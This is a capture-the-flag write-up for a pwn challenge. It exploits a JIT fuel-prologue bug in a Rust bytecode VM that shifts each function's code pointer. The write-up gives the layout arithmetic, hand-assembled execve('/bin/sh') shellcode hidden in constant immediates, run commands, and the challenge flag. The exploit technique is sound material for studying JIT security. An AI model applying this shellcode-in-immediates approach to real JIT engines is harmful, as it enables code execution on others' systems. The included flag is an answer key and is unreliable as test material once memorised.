# v67

**Category:** pwn · **Points:** 86 · **Solves:** 91 · **Author:** rairosu

## Challenge

A tiny Rust VM with a baseline JIT. You upload a bytecode module, the VM runs
the entry function, and the JIT compiles functions that get hot:

```
V67L bytecode length:
```

The flavour text is about "random crashes in the JIT" — they are not random.
The service (`socat -T40 TCP-LISTEN:1337,reuseaddr,fork EXEC:python3
/server.py`) reads a length, then exactly that many bytes, writes them to a
temporary file and runs `/v67l <file>` **with the socket inherited as
stdin/stdout**, so anything we `execve` talks to us directly.

## TL;DR

`emit_fuel_prologue()` charges fuel with

```rust
self.assembler.load_immediate(std::ptr::from_ref(function) as usize as i64);
self.assembler.add_memory_immediate(0, function.instruction_count as u32);
```

i.e. `movabs rax, &Function` + `add qword [rax+0], instruction_count`. But
offset 0 of `#[repr(C)] Function` is `jit_entry`, not `fuel` (`fuel` is at
offset 8). The first native call adds `instruction_count` to the function's own
**code pointer**, and `vm.rs::invoke` re-reads `native_entry()` on every call.
So the second native call starts `instruction_count` bytes into the compiled
code. The code page is RWX and `OP_CONST` emits its immediate verbatim, so we
choose a function with `N = 40` instructions — the drift lands exactly on
`CONST #1`'s 8-byte immediate, which we fill with `execve("/bin/sh", NULL,
NULL)`.

## Files

| file | what it is |
| --- | --- |
| `gen.py` | builds `exp.v67l` (the 478-byte bytecode module) |
| `pwn.py` | sends the module, then drives the shell |
| `src/lib.rs` | `Function` layout, fuel accounting, JIT thresholds |
| `src/jit/x64.rs` | code emission, `emit_fuel_prologue`, `OP_CONST` |
| `src/jit/x64/assembler.rs` | `movabs` / `add qword [mem], imm32` encodings |
| `src/vm.rs` | `invoke()` — re-reads `native_entry()` per call |
| `server.py`, `Dockerfile` | upload wrapper and service image |

## Analysis

### Module format

```
"V67L" | version:u8=1 | func_count:u16 | entry:u16
per function: arity:u8 | registers:u8 | code_len:u32 | code[code_len]
```

Opcodes used by the payload (`0x01` CONST, `0x04` SUB, `0x0F` STORE, `0x09`
JMP, `0x0A` JZ, `0x0B` CALL, `0x0C` RET) are all fixed-size, and jump targets
are validated to land on instruction boundaries.

### The struct

```rust
#[repr(C)]
pub(crate) struct Function {
    jit_entry: UnsafeCell<*mut u8>,   // offset 0
    fuel: AtomicU64,                  // offset 8
    arity: u8,
    registers: u8,
    instruction_count: u64,
    instructions: Vec<Decoded>,
    jit_state: AtomicU8,
}
```

```rust
fn emit_fuel_prologue(&mut self, function: &Function) {
    self.assembler.load_immediate(std::ptr::from_ref(function) as usize as i64);
    self.assembler.add_memory_immediate(0, function.instruction_count as u32);
}
```

`add_memory_immediate(0, n)` is the fuel charge — `add qword [rax+0], n`. It
was meant to be `[rax+8]`. Since `[rax+0]` is `jit_entry`, every first native
call rewrites the entry pointer to `entry + instruction_count`. `vm.rs::invoke`
does not cache it; it calls `function.native_entry()` each time, so the *next*
call enters at the drifted address.

### Native layout

| piece | bytes | offset |
| --- | --- | --- |
| `movabs rax, &Function` | 10 | 0 |
| `add qword [rax+0], N` | 11 | 10 |
| `OP_CONST` = `movabs rax, imm64` + `mov [rdi+off32], rax` | 10 + 7 | 21 + 17k |
| the k-th immediate | 8 | **23 + 17k** |
| `OP_RET` = `mov rax,[rdi+off32]` + `ret` | 7 + 1 | after the last CONST |

A function with exactly `N = 23 + 17k` instructions drifts onto its own k-th
immediate. `k = 1` gives `N = 40`: 39 `CONST`s and the `RET` (`code_len`
validation insists that the last instruction is `RET`/`JMP`). The arena is
`mmap(PROT_READ|PROT_WRITE|PROT_EXEC)` and there is no constant blinding, so
the immediate is executed as-is.

### Shellcode

The compiled function is called with `rdi` = register file, `rsi` = heap base,
`rdx` = heap length, `rcx` = runtime. The entry function already stored
`"/bin/sh\0"` at `heap[0]`, so `rsi` *is* the path — that is what keeps the
shellcode down to three 6-byte chunks:

```
48 89 f7 31 f6 90     mov rdi, rsi ; xor esi, esi ; nop
31 d2 6a 3b 58 90     xor edx, edx ; push 0x3b ; pop rax ; nop
0f 05 90 90 90 90     syscall ; nops
```

Every immediate is 8 bytes: 6 of code plus `eb 09`, which jumps over the 7-byte
store and the next 10-byte `movabs` (17 bytes) into the following immediate.
`0x3b` is `SYS_execve`; `argv`/`envp` are `NULL`, which the kernel accepts.

### Making it hot

`jit_threshold` defaults to `256` and `record_interpreted_invocation()` charges
`instruction_count` per interpreted call, so a 40-instruction function is queued
for compilation after 7 calls. The compiler runs on another thread; the entry
function calls it 20000 times (`fuel += 40` each, 800000 total) which is far
more than needed for the code to be installed. After that:

* call *n* — native, prologue drifts the pointer, body runs, returns 0;
* call *n+1* — native, starts at `entry + 40` = `CONST #1`'s immediate →
  shellcode.

### Entry function

`f0` (10 instructions, `registers = 8`, `arity = 0`):

```
CONST r0 = "/bin/sh\0"
CONST r1 = 0
STORE heap[0] = r1?           -> heap[0] = r0   (OP_STORE addr=r1, src=r0)
CONST r3 = 20000
CONST r4 = 1
loop: CALL f1 -> r2
      SUB r3, r3, r4
      JZ  r3 -> ret
      JMP loop
```

Not a single instruction of it is attacker-hostile — the only "malicious"
input is the *length* of `f1` and the bytes of its immediates.

## Solution

Two steps, no leaks, no retries:

```
python3 gen.py exp.v67l
python3 pwn.py <HOST> <PORT> exp.v67l 'id; cat /flag.txt'
```

`pwn.py` speaks TLS on port 443, waits for `V67L bytecode length: `, sends the
length line, then the 478-byte module, waits ~3 s for the JIT, and sends the
commands. The shell is the socket, because `server.py` uses
`subprocess.run(["/v67l", program.name])` and inherits stdin/stdout.

Observed:

```
V67L bytecode length: 
[*] sent 478 bytes of bytecode
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
flag{...}
```

## Flag

```
flag{6b35552d2cdda443a67b56060bbe9532}
```

## Notes

* The drift is silent on the first call: the prologue *and* the body still run,
  the function just returns normally. That is why the bug only shows up as
  "the second call crashes / behaves weirdly".
* `N = 40` is not the only choice — `23 + 17k` for any `k` works, and the code
  is simply `chunk || eb 09` repeated. `k = 1` was picked because it keeps the
  function small and leaves the fewest bytes to place.
* A first version used six chunks and passed `argv` explicitly (writing the
  pointer into `heap[0x10]` with `mov [rsi+0x10], rdi`); noticing that `rsi`
  already points at the `OP_STORE`-written path cut it to three chunks.
* Inserting a debug store into the prologue (to log the drifted pointer) moves
  the code layout and breaks `23 + 17k` — the constant has to be recomputed if
  the emitter changes at all.
* `--jit-threshold` is a command-line flag of `/v67l`, but the service uses the
  default 256; the exploit does not depend on it because the call loop is
  iterative, not recursive, so no interpreter recursion limit is hit either
  (heap: 1024 words, plenty for one string).
